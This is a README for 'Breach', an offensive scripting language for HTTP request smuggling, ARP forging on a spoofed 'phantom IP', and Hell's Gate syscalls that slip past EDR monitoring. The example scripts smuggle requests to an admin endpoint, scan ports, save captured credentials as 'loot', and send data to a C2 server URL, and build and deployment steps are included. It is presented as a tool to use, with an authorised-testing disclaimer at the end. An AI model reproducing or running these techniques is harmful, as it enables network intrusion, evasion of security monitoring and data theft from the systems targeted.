<div align="center">

<h1><b>B R E A C H</b></h1>

**Ring-0 Network Execution & Layer 7 Desynchronization Language**

<br>


![Rust](https://img.shields.io/badge/Language-Rust-orange)
![Status](https://img.shields.io/badge/Status-Experimental-purple)
![Security Research](https://img.shields.io/badge/Purpose-Security%20Research-red)
![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-blue)
![License](https://img.shields.io/badge/License-MIT-green)

<br><br>

> *Breach is a highly specialized turing-complete interpreted programming language (`.brc`).*

</div>

<br>

## ⫸ Navigation
* [Abstract](#-abstract)
* [Architecture](#-1-architectural-overview)
* [L2/L3 Evasion](#-2-l2l3-evasion-the-phantom-ip--custom-tcp-stack)
* [L7 Mutilation](#-3-l7-protocol-mutilation-htx-bypasses)
* [Hell's Gate](#-4-endpoint-evasion-dynamic-syscall-resolution)
* [Language Specs](#-5-the-breach-language-brc-virtual-machine)
* [Usage Examples](#-7-core-functions-and-usage)
* [Deployment](#-8-deployment--build-prerequisites)

## ⫸ Project Structure
```text
.
├── lib/
│   ├── Packet.lib
│   ├── wpcap.lib
├── src/
│   ├── hunter.rs    
│   ├── syscall.rs      
│   └── main.rs         
├── .gitignore
├── Cargo.lock
├── Cargo.toml
├── LICENSE
├── README.md
├── build.rs
├── script.brc
└── turing_evidence.log
```

## ⫸ Abstract

Breach is a highly specialized turing-complete interpreted programming language (`.brc`). 

The primary objective of this language is to execute advanced HTTP Request Smuggling (CL.TE, TE.CL, CL.0) and proxy-evasion attacks by entirely decoupling the execution from the host operating system's standard OSI network stack. By implementing a custom TCP state machine, an active ARP deception listener, and NTAPI syscall resolution (Hell's Gate), Breach bypasses host-level TCP Reset (RST) interference, user-land API hooks, and enterprise-grade HTTP-to-HTX reverse proxies (e.g., HAProxy 2.x+).

---

## ⫸ 1. Architectural Overview

Traditional offensive environments rely on standard socket implementations (e.g., POSIX sockets, Winsock). This introduces a critical failure point: the host OS kernel monitors and manages all TCP state transitions. When an execution requires sending desynchronized, malformed, or spoofed packets, the host OS frequently detects state anomalies (e.g., receiving a SYN-ACK for a connection it did not initiate) and forcefully terminates the connection by emitting a TCP RST.

Breach abandons the OS network stack entirely. Utilizing `libpnet` for datalink-layer interface access, Breach manually constructs Ethernet, IPv4, and TCP frames byte-by-byte. It operates its own asynchronous listener in promiscuous mode, allowing it to hold open raw TCP pipes without host kernel interference.

---

## ⫸ 2. L2/L3 Evasion: The Phantom IP & Custom TCP Stack

To achieve true Ring-0 packet injection without triggering host-based firewall drops, Breach utilizes a localized network ghosting technique to blind the host OS.

### 2.1 The Phantom IP Protocol
When establishing the `gateway` pipeline, Breach does not use the host's actual IP address. It dynamically binds the execution to an unused "Phantom IP" on the local subnet (e.g., 192.168.56.200). 
* When the target sends responses (like a SYN-ACK) back to the Phantom IP, the host OS kernel simply ignores the packet because the IP is unassigned to the physical adapter. This permanently neutralizes outbound RST interference.
* The language binds directly to the Network Interface Card (NIC) at Layer 2, intercepting frames before they are processed by the host OS IP stack.

### 2.2 Active ARP Forging & Interception
Because the Phantom IP does not physically exist, the target gateway will broadcast ARP requests before routing TCP packets. 
* Breach implements an active Layer 2 interception loop. It sniffs the wire for ARP broadcasts targeting the Phantom IP.
* Upon detection, Breach dynamically crafts an `ArpOperations::Reply` frame. It manually sets the hardware type, protocol type, and maps the Phantom IP to the host's physical MAC address, successfully deceiving the target's ARP table and establishing the L2 linkage.

### 2.3 Manual TCP State Synchronization
Once the L2 link is established, Breach manually drives the 3-way handshake via custom packet forging:
1. Constructs and injects the initial SYN frame, calculating the IPv4 header checksum and TCP segment checksum.
2. Captures the target's SYN-ACK from the wire, extracting the raw Sequence (SEQ) and Acknowledgement (ACK) numbers.
3. Calculates the mathematical offsets (`next_ack = h_seq + 1`) and injects the finalizing ACK.
4. Maintains the hijacked SEQ/ACK variables in the language's virtual machine memory for subsequent payload delivery (PSH-ACK).

``` mermaid
    ---
config:
  flowchart:
    nodeSpacing: 80
    rankSpacing: 160
    curve: stepBefore
  theme: dark
  layout: dagre
  look: handDrawn
  fontFamily: '''Source Code Pro Variable'', monospace'
  themeVariables:
    fontFamily: '''Source Code Pro Variable'', monospace'
---
graph TD
    subgraph Tier_User [TIER 1: USERLAND EXECUTION]
        VM[Breach .brc VM]
    end
    subgraph Tier_Link [TIER 2: DATA LINK LAYER]
        NIC[Physical NIC]
        Ghost((Phantom IP))
    end
    subgraph Tier_Kernel [TIER 3: HOST KERNEL]
        OS[Host OS Kernel]
    end
    subgraph Tier_Target [TIER 4: REMOTE TARGET]
        Target[Target Gateway]
    end
    VM ==>|1. Raw SYN Injection| NIC
    NIC ==>|2. L2 Packet Forward| Target
    Target -.->|3. ARP Broadcast| NIC
    NIC ==>|4. Forged ARP Reply| Target
    Target -.->|5. SYN-ACK Response| Ghost
    Ghost -.->|6. Promiscuous Capture| VM
    OS -.-x|RST Dropped| Ghost
    classDef breach fill:#0b5394,stroke:#3d85c6,stroke-width:3px,color:#fff
    classDef kernel fill:#741b47,stroke:#a64d79,stroke-width:2px,color:#fff
    classDef phantom fill:#351c75,stroke:#674ea7,stroke-width:3px,color:#fff
    classDef hardware fill:#274e13,stroke:#6aa84f,stroke-width:2px,color:#fff

    class VM breach
    class OS kernel
    class Ghost phantom
    class NIC,Target hardware
    style Tier_User fill:none,stroke:none
    style Tier_Link fill:none,stroke:none
    style Tier_Kernel fill:none,stroke:none
    style Tier_Target fill:none,stroke:none
```

---

## ⫸ 3. L7 Protocol Mutilation: HTX Bypasses

Modern reverse proxies (like HAProxy 2.x+) utilize strict HTTP-to-HTX engines that normalize headers, dropping or rejecting payloads containing ambiguous Transfer-Encoding values (resulting in 400 Bad Request or 422 Unprocessable Content errors). Breach implements dynamic protocol mutilation to force backend desynchronization.

### 3.1 CL.0 Request Smuggling
Breach abandons traditional Transfer-Encoding obfuscation in environments with strict HTX validation. Instead, the language dynamically constructs CL.0 payloads:
* It generates a standard GET request.
* It artificially attaches a Content-Length header matching the exact byte-size of a secondary, embedded request hidden in the body.
* **The Vulnerability:** The frontend proxy interprets the GET request, assumes it lacks a body per RFC specifications, and forwards the entire buffer. The backend WSGI/Application server honors the Content-Length anomaly, processes the first request, and immediately executes the trailing bytes as a secondary, smuggled payload.

### 3.2 Double-Identity Header Evasion
For targets requiring TE obfuscation, Breach injects conflicting Transfer-Encoding arrays (e.g., `Transfer-Encoding: identity` followed by `Transfer-Encoding: chunked`). The proxy parses the `identity` directive (passing the payload unmodified), while the backend processes the `chunked` directive, initiating the desync payload execution.

``` mermaid
    ---
config:
  flowchart:
    nodeSpacing: 100
    rankSpacing: 100
    curve: stepBefore
  theme: dark
  look: handDrawn
  fontFamily: '''Source Code Pro Variable'', monospace'
---
graph TD
    subgraph Tier_Engine [TIER 1: USERLAND PAYLOAD GENERATION]
        VM[Breach Engine]
    end
    subgraph Tier_Proxy [TIER 2: PROXY INTERFACE]
        Proxy[Firewall]
    end
    subgraph Tier_Target [TIER 3: BACKEND EXECUTION]
        Backend[Server]
    end
    VM ==>|1. Inject CL.0 Buffer| Proxy
    Proxy ==>|2. Transparent Forward| Backend
    Backend -.->|3. Return Initial Response| VM
    Backend -.->|4. Return Smuggled Response| VM
    classDef breach fill:#0b5394,stroke:#3d85c6,stroke-width:3px,color:#fff
    classDef infra fill:#274e13,stroke:#6aa84f,stroke-width:2px,color:#fff
    classDef server fill:#351c75,stroke:#674ea7,stroke-width:3px,color:#fff

    class VM breach
    class Proxy infra
    class Backend server
    style Tier_Engine fill:none,stroke:none
    style Tier_Proxy fill:none,stroke:none
    style Tier_Target fill:none,stroke:none
```

---

## ⫸ 4. Endpoint Evasion: Dynamic Syscall Resolution

Breach is designed to operate in highly monitored environments where user-land API hooks (EDR/AV) monitor sensitive actions like file I/O operations and memory allocations.

### 4.1 Hell's Gate (NTAPI Resolution)
Instead of relying on standard Rust `std::fs` calls which wrap the Win32 API (`WriteFile`), Breach implements a custom memory-hunting algorithm targeting `ntdll.dll` on Windows architectures.
* The engine dynamically locates the base address of `ntdll.dll` using `GetModuleHandleA`.
* It walks the Export Directory to locate undocumented NTAPI functions (e.g., `NtWriteFile`).
* It extracts the System Service Number (SSN) directly from the function stub by matching the opcode signature (`0x4C, 0x8B, 0xD1, 0xB8`).
* By resolving the SSN dynamically, Breach can execute raw syscalls directly to the kernel, entirely bypassing Ring-3 EDR telemetry during post-exploitation loot logging.

``` mermaid
    ---
config:
  flowchart:
    nodeSpacing: 100
    rankSpacing: 140
    curve: stepBefore
  theme: dark
  look: handDrawn
  fontFamily: '''Source Code Pro Variable'', monospace'
---
graph TD
    subgraph Tier_Engine [TIER 1: USERLAND EXECUTION]
        B[Breach Engine]
    end
    subgraph Tier_Memory [TIER 2: LIBRARY MEMORY SPACE]
        NT[ntdll.dll Export Directory]
    end
    subgraph Tier_EDR [TIER 3: EDR / AV TELEMETRY]
        H[API Hooks & User-land Monitoring]
    end
    subgraph Tier_Kernel [TIER 4: KERNEL SPACE]
        K[Windows Kernel]
    end
    B ==>|"1. Base Address Hunt"| NT
    NT ==>|"2. Extract SSN via Opcode Scan"| B
    B -.->|"Standard API Call (Intercepted)"| H
    B ==>|"3. Direct Syscall Execution"| K
    H -.-x|"No Telemetry Logged"| K
    classDef breach fill:#0b5394,stroke:#3d85c6,stroke-width:3px,color:#fff
    classDef danger fill:#990000,stroke:#cc0000,stroke-width:2px,color:#fff
    classDef system fill:#274e13,stroke:#6aa84f,stroke-width:2px,color:#fff

    class B breach
    class H danger
    class NT,K system
    style Tier_Engine fill:none,stroke:none
    style Tier_Memory fill:none,stroke:none
    style Tier_EDR fill:none,stroke:none
    style Tier_Kernel fill:none,stroke:none
```

---

## ⫸ 5. The Breach Language (.brc) Virtual Machine

Breach is a full virtual machine encompassing a Lexer, an Abstract Syntax Tree (AST) Parser, and a dynamic memory allocator.

### 5.1 Compiler Architecture
* **Custom Lexer:** Utilizes Regex-based tokenization to parse identifiers, keywords, IPs, and network operators into a strict `Token` enum stream.
* **Recursive-Descent Parser:** Evaluates the token stream into executable AST nodes, maintaining a `HashMap` for dynamic memory scoping and variable resolution.
* **Mutation Engine:** Implements a token stream mutator that randomly injects polymorphic junk variables (`_v_XX`) during execution to alter the signature of the execution flow in memory.

### 5.2 Language Capabilities
* **Dynamic Typing:** Native support for Num, Str, Bool, List, Dict, and Gateway objects.
* **Asynchronous Swarming:** The `swarm` keyword utilizes the `tokio` runtime to dispatch hundreds of parallel, non-blocking green threads for rapid subnet scanning and port enumeration.
* **Control Flow:** Full support for `while`, `for...in`, `if/else`, and `try/rescue` exception handling.
* **Modularity:** Support for user-defined functions (`fn`) and external module imports (`import`).

### 5.3 Syntax & Execution Example

```ruby
// target_infrastructure.brc

// 1. Memory Allocation & Target Definition
set target = "192.168.56.104";

// 2. Ring-0 TCP Hijack
// Initiates the Phantom IP ARP responder and locks the TCP pipe.
set tunnel = gateway target;

// 3. Payload Mutator
// Constructs a CL.0 desynchronization attack targeting a restricted endpoint.
set poison = desync("CL.0", "/admin_dashboard", target);

// 4. Raw Injection
// Pushes the byte-array directly into the established TCP state machine.
tunnel => poison;

// 5. Wire Extraction
// Listens on the promiscuous socket for the backend's raw HTTP response.
set loot = <= tunnel;

// 6. NTAPI Evasive Logging
// Uses Hell's Gate syscalls to write the loot to disk securely.
write "loot_dump.txt" loot;
log "Operation Complete.";
```

## ⫸ 6. Standard Library & Keyword Lexicon

Breach includes a comprehensive, Turing-complete standard library directly integrated into its AST Parser. It requires no external dependencies to execute complex logic, memory management, or asynchronous networking.

### 6.1 Data Structures & Memory Management
Breach utilizes dynamic typing with native support for arrays (`list`) and hashmaps (`dict`).

* **`set`**: Allocates variables and assigns types dynamically.
* **`list` / `push` / `pop`**: Initializes arrays and manipulates the stack.
* **`dict` / `put` / `get`**: Initializes hashmaps, assigns key-value pairs, and retrieves data.
* **`num`**: Explicitly casts string or boolean values into floating-point numbers.

```ruby
// Array manipulation
set targets = list;
push targets "192.168.1.10";
push targets "192.168.1.11";
pop targets; // Removes the last element

// HashMap initialization and access
set config = dict;
put config "timeout" 500;
set current_timeout = get config "timeout";
```

### 6.2 Network & Discovery Primitives
Beyond the Ring-0 `gateway` protocol, Breach includes native asynchronous networking capabilities for reconnaissance and data exfiltration.

* **`swarm` ... `ports` ... `to`**: Dispatches hundreds of non-blocking `tokio` green threads to asynchronously scan a target across a port range.
* **`scan`**: Performs a synchronous, timeout-based TCP connection check on a single port.
* **`resolve`**: Executes DNS resolution against a hostname to extract the IPv4 address.
* **`transmit`**: Executes an HTTP POST request to exfiltrate payloads or JSON configurations to a C2 server.
* **`payload`**: Opens a raw TCP stream to a specified IP/Port and injects a raw string payload without desync chunking.

```ruby
// Resolve DNS and asynchronous port swarming
set target_ip = resolve "internal.corp.local";

swarm target_ip ports 1 to 1024:
    if 1: // Evaluates true if TCP socket opens successfully
        log "Discovered active port!";
    end
end

// Exfiltrate discovered data
transmit "[http://c2.server/ingest](http://c2.server/ingest)" config;
```

### 6.3 Evasive File Operations (Hell's Gate)
Standard file operations trigger Ring-3 EDR telemetry. Breach utilizes keywords that dynamically resolve the `NtWriteFile` System Service Number (SSN) via in-memory hunting.

* **`write`**: Truncates and writes data to a file using direct kernel syscalls.
* **`append`**: Appends data to an existing file using direct kernel syscalls.

```ruby
write "loot.txt" "Initializing capture...";
append "loot.txt" "Admin:Password123";
```

### 6.4 Control Flow & Exception Handling
Breach supports standard structural control flow, iteration, and robust error handling to prevent execution crashes during volatile network operations.

* **`if` / `while` / `for ... in`**: Standard conditional branching and loops.
* **`try` / `rescue`**: Catches internal runtime panics (e.g., socket failures, invalid casting) and allows safe fallback execution.
* **`panic`**: Manually triggers a runtime exception.
* **`break`**: Instantly terminates the current loop execution.

```ruby
// Exception Handling
try:
    set ip = resolve "invalid.domain.local";
    scan ip:
        log "Target acquired.";
    end
rescue:
    log "Resolution or scan failed. Falling back...";
end

// Iteration over a list
for target in targets:
    if target == "192.168.1.10":
        break;
    end
end
```

### 6.5 Modularity, Functions & Utilities
Breach allows for reusable code blocks and the construction of complex standard libraries across multiple files.

* **`fn` (or `op`) / `return`**: Defines a custom function with arguments and returns a dynamic value.
* **`call`**: Executes a defined function.
* **`import`**: Parses and loads an external `.brc` script, inheriting its functions and global memory.
* **`log`**: Prints output to `stdout`.
* **`input`**: Prompts the user via `stdin` during execution.
* **`wait`**: Suspends the current thread execution for a specified number of milliseconds.
* **`rand` ... `to`**: Generates a cryptographically secure random number within a range.

```ruby
// Import external payload libraries
import "lib_evasion.brc";

// Define a custom operation
fn generate_seed max_val:
    set seed = rand 1 to num(max_val);
    return seed;
end

// Execute and capture
set session_id = call generate_seed 9999;
wait 500; // Sleep for 500ms
log session_id;
```

---

## ⫸ 7. Core Functions and Usage

Breach utilizes a custom, pipeline-oriented execution syntax (`.brc`) designed specifically for offensive network operations. Below are the primary architectural features and their corresponding implementations.

### 7.1 Ring-0 Gateway & Desynchronization
Establish a Phantom IP pipeline, lock the TCP state machine, and inject a CL.0 Request Smuggling payload entirely outside the host OS network stack.

```ruby
// 1. Define the localized target infrastructure
set target = "192.168.56.104";

// 2. Establish raw L2/L3 tunnel (Bypasses OS TCP stack via Phantom IP)
set tunnel = gateway target;

// 3. Construct the CL.0 payload targeting a restricted endpoint
set poison = desync("CL.0", "/admin_dashboard", target);

// 4. Inject into the hijacked TCP state machine (PSH-ACK sequence)
tunnel => poison;

// 5. Extract raw backend HTTP response from the wire
set loot = <= tunnel;
log loot;
```

### 7.2 Async Network Swarming
Breach natively interfaces with the `tokio` runtime. The `swarm` keyword dispatches hundreds of parallel, non-blocking green threads for rapid subnet scanning and port enumeration without blocking the main execution thread.

```ruby
// Target declaration
set target_ip = "192.168.56.104";

// Launch parallel execution across a port range
swarm target_ip ports 1 to 1024:
    // Block executes asynchronously for every port
    if 1: // Internal boolean flag triggered if TCP handshake succeeds
        log "Open Port Detected.";
    end
end
```

### 7.3 Evasive File I/O (Hell's Gate Syscalls)
Standard file operations trigger Ring-3 EDR and AV telemetry. Breach utilizes `write` and `append` keywords that dynamically resolve `NtWriteFile` via in-memory hunting, executing raw syscalls directly to the kernel.

```ruby
// Direct syscall write, bypassing standard Rust std::fs and Win32 APIs
write "loot_dump.txt" loot;

// Append additional captured data using resolved SSNs
append "loot_dump.txt" "Admin:Password123";
```

### 7.4 Data Structures & Control Flow
The language supports dynamic typing, iteration, and dictionary manipulation for complex payload generation and configuration management.

```ruby
// Dictionary Initialization & Manipulation
set config = dict;
put config "timeout" 500;
put config "retries" 3;

// List Operations
set ports = list;
push ports 80;
push ports 443;
pop ports;

// Standard Iteration
for p in ports:
    if p == 80:
        log "Targeting standard HTTP buffer.";
    end
end
```

---

## ⫸ 8. Deployment & Build Prerequisites

Due to the L2 datalink manipulation, Breach requires specialized compilation and execution environments.

### 8.1 Build Instructions
```bash
git clone [https://github.com/yourusername/breach-language.git](https://github.com/yourusername/breach-language.git)
cd breach-language
cargo build --release
```

### 8.2 Execution Requirements
The language is invoked by passing a `.brc` script as the primary argument. The parser strictly enforces the `.brc` extension.
```bash
cargo run --release -- payload.brc
```

> **Windows Host:** Npcap must be installed with WinPcap API-compatible mode enabled. The binary must be executed within an elevated Administrative terminal to bind to raw sockets.

> **Linux Host:** `libpcap-dev` is required. The binary must be executed as `root`, or assigned raw socket capabilities via:
> `sudo setcap cap_net_raw,cap_net_admin=eip target/release/breach_core`

---

## ⫸ 9. Ethical Disclaimer

This programming language was engineered exclusively for authorized security research, protocol analysis, and academic demonstration. Breach exposes fundamental architectural flaws in OSI layer decoupling, HTX parsing implementations, and host-based networking stacks. It is provided "as-is" for penetration testers and security engineers to validate enterprise infrastructure resilience. 

The author assumes zero liability for any direct, indirect, or consequential damages arising from the use or misuse of this language. **Do not execute `.brc` scripts against networks, endpoints, or infrastructure without explicit, documented authorization.**